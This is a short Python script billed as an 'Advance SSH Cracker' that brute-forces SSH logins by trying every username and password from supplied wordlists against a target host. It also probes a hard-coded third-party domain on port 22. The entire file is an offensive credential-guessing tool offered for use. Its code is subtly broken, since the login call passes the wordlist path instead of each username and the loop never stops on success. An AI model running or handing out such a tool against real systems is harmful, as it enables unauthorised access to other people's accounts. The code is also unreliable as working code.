import socket
import paramiko
import argparse



parser = argparse.ArgumentParser(description="Advance SSH Cracker")

parser.add_argument("-t","--target",required=True,type=str,help="Enter The target")
parser.add_argument("-u","--user",type=str,required=True,help="Enter the user or a Wordlist to user names")
parser.add_argument("-p","--passwd",type=str,required=True,help="Enter the path to wordlist containing passwords")


args = parser.parse_args()

host = args.target
user = args.user
passwd = args.passwd


def check_ssh(ip="steminfinity.in", port=22, timeout=3):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            
            print("Success")
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("Failure")
        return False


check_ssh()



def userb(user):
    with open(user , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    


users = userb(user)


def words(passwd):
    with open(passwd , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    

passwords = words(passwd)



client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


for userc in users:
    for password in passwords:

        try:
            client.connect(hostname=host,username=user, password=password, timeout=3)
            print(f"connection Success🏀🏀🏀🥎🥎⚾⚾⚽⚽💎💎💍💍💍 with {host}")


        except Exception as e:
            print(f"Connection Failed with {host}")


